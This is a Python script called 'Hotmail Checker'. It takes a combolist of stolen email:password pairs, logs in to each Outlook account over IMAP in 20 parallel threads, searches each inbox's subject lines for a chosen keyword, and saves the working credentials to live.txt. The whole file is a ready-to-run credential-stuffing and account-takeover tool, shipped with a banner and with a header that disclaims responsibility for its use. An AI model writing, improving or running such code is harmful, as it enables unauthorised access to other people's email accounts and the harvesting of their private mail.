# MIT License
# Copyright (c) 2024 T A B $ $
# All Rights Reserved By Tabss
# You can use this tool by your own, just don't edit the code.
# Don't be a skidder and learn about code.
# This tool is for educational purpose, i don't care about the use of the tool.
# Enjoy :)


import imaplib
import email
from email.header import decode_header
from concurrent.futures import ThreadPoolExecutor, as_completed
import time
import sys
from pystyle import Colorate, Colors, Center
from colorama import *
import os
import ctypes

ctypes.windll.kernel32.SetConsoleTitleW("Hotmail Checker | Made by Tabss 💔")


m=Fore.MAGENTA
lm=Fore.LIGHTMAGENTA_EX
w=Fore.WHITE
lw=Fore.LIGHTWHITE_EX
black=Fore.LIGHTBLACK_EX
y=Fore.LIGHTYELLOW_EX
r=Fore.LIGHTRED_EX
g=Fore.GREEN
lg=Fore.LIGHTGREEN_EX
c=Fore.CYAN
lc=Fore.LIGHTCYAN_EX
blue=Fore.BLUE
lb=Fore.LIGHTBLUE_EX
reset=Fore.RESET

def slow_write(text):
    for x in text:
        print(x, end="")
        sys.stdout.flush()
        time.sleep(0.0005)

def loading_animation(duration=5):
    loading_chars = ['|', '/', '-', '\\']
    end_time = time.time() + duration
    
    while time.time() < end_time:
        for char in loading_chars:
            print(f"\rLoading headers and threads {char}", end="")
            sys.stdout.flush()
            time.sleep(0.2) 


txbss1 = Center.XCenter(f"""
╦ ╦╔═╗╔╦╗╔╦╗╔═╗╦╦    ╔═╗╦ ╦╔═╗╔═╗╦╔═╔═╗╦═╗
╠═╣║ ║ ║ ║║║╠═╣║║    ║  ╠═╣║╣ ║  ╠╩╗║╣ ╠╦╝
╩ ╩╚═╝ ╩ ╩ ╩╩ ╩╩╩═╝  ╚═╝╩ ╩╚═╝╚═╝╩ ╩╚═╝╩╚═
""")
time.sleep(0.0002)


txbss = Center.XCenter(f"""
                                          ...:----:...                                              
                                     .:=#@@@@@@@@@@@@@@%*-..                                        
                                  .:#@@@@@@@%#*****#%@@@@@@@+..                                     
                               ..-@@@@@%-...... ........+@@@@@@..                                   
                               :%@@@@=..   .#@@@@@@@@#=....+@@@@*.                                  
                             .+@@@@=.      .*@@@%@@@@@@@@=...*@@@@:.                                
                            .#@@@%.                 .=@@@@@=. .@@@@-.                               
                           .=@@@#.                    .:%@@@*. -@@@%:.                              
                           .%@@@-                       .*@@*. .+@@@=.                              
                           :@@@#.                              .-@@@#.                              
                           -@@@#                                :%@@@.                              
                           :@@@#.                              .-@@@#.                              
                           .%@@@-.                             .+@@@=.                              
                           .+@@@#.                             -@@@%:.                              
                            .*@@@%.                          .:@@@@-.                               
                             .+@@@@=..                     ..*@@@@:.                                
                               :%@@@@-..                ...+@@@@*.                                  
                               ..-@@@@@%=...         ...*@@@@@@@@#.                                 
                                  .:*@@@@@@@%*++++**@@@@@@@@=:*@@@@#:.                              
                                     ..=%@@@@@@@@@@@@@@%#-.   ..*@@@@%:.                            
                                        .....:::::::....       ...+@@@@%:                           
                                                                  ..+@@@@%-.                        
                                                                    ..=@@@@%-.                      
                                                                      ..=@@@@@=.                    
                                                                         .=%@@@@=.                  
                                                                          ..-%@@@-.                 
                                                                             ....
""")
time.sleep(0.0005)


inf = Center.XCenter(f"""
{r}        ┏┳┓    ┓  ┳  ┏          •    
{r}         ┃ ┏┓┏┓┃  ┃┏┓╋┏┓┏┓┏┳┓┏┓╋┓┏┓┏┓
{r}         ┻ ┗┛┗┛┗  ┻┛┗┛┗┛┛ ┛┗┗┗┻┗┗┗┛┛┗

{black}[ {r}+ {black}]{w} Creator: {r}Tabss
{black}[ {r}+ {black}]{w} CPM: {r}60
{black}[ {r}+ {black}]{w} Worker: {r}Hotmail
{black}[ {r}+ {black}]{w} Proxy: {r}Proxyless (optional to use vpn)
{black}[ {r}+ {black}]{w} Status: {g}Working{reset}

""")
time.sleep(0.0005)

def procurar(user, password, keyword, livetxt):
    try:
        mail = imaplib.IMAP4_SSL("outlook.office365.com")
        mail.login(user, password)
        mail.select("inbox")

        status, messages = mail.search(None, "ALL")
        email_ids = messages[0].split()

        found = False
        
        for email_id in email_ids:
            status, msg_data = mail.fetch(email_id, "(RFC822)")
            for response_part in msg_data:
                if isinstance(response_part, tuple):
                    msg = email.message_from_bytes(response_part[1])
                    subject, encoding = decode_header(msg["Subject"])[0]
                    if isinstance(subject, bytes):
                        subject = subject.decode(encoding if encoding else "utf-8")
                    if keyword.lower() in subject.lower():
                        found = True
                        break 

            if found:
                break 

        if found:
            result_message = f"{black}[ {g}+ {black}] {g}Keyword found: {keyword.capitalize()} {blue}( {g}* {blue}) {g}Saved in 'live.txt'{reset}"
            with open(livetxt, "a") as file:
                file.write(f"{user}:{password} | {keyword.capitalize()}\n")
        else:
            result_message = f"{black}[ {r}- {black}]{w}No messages with keyword found.{reset}"

        mail.logout()

    except imaplib.IMAP4.error:
        result_message = f"{black}[ {r}- {black}] {r}Dead {blue}( {g}* {blue}) {r}No Keyword Found{reset}" 
    except Exception as e:
        result_message = f"{black}[ {r}+ {black}] {r}Dead {blue}( {g}* {blue}) {r}No keyword Found{reset}"  

    return user, result_message

def main():
    os.system("cls")
    print(Colorate.Vertical(Colors.red_to_black, txbss1))
    time.sleep(2)
    print(Colorate.Vertical(Colors.red_to_black, txbss))
    loading_duration = 5 
    loading_animation(loading_duration)
    print(f"\n{g}All Successfully Setup! {r}Lets use me.{reset}")
    time.sleep(2)
    os.system("cls")
    print(Colorate.Vertical(Colors.red_to_black, inf))
    time.sleep(7)
    os.system("cls")
    time.sleep(2)
    print(Colorate.Vertical(Colors.red_to_black, txbss1))

    file1 = (input(f"{y}Combolist:{reset} "))
    keyword = (input(f"{y}keyword:{reset} "))
    livetxt = "live.txt"  

    try:
        with open(file1, "r") as file:
            lines = file.readlines()

        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = []
            for line in lines:
                line = line.strip()
                if not line:
                    continue
                try:
                    user, password = line.split(":", 1)
                    futures.append(executor.submit(procurar, user, password, keyword, livetxt))
                except ValueError:
                    print(f"{black}[{r}+{black}] {w}Invalid Form: {line}{reset}")

            for future in as_completed(futures):
                user, result = future.result()
                print(f"{black}[ {r}+ {black}]: {w}{user} {reset} {result}")

    except FileNotFoundError:
        print(f"{black}[ {r}? {black}]{w}File doesn't found !!!.{reset}")
    except Exception as e:
        print(f"{black}[ {r}- {black}]{w}Error reading the file: {e}{reset}")

if __name__ == "__main__":
    main()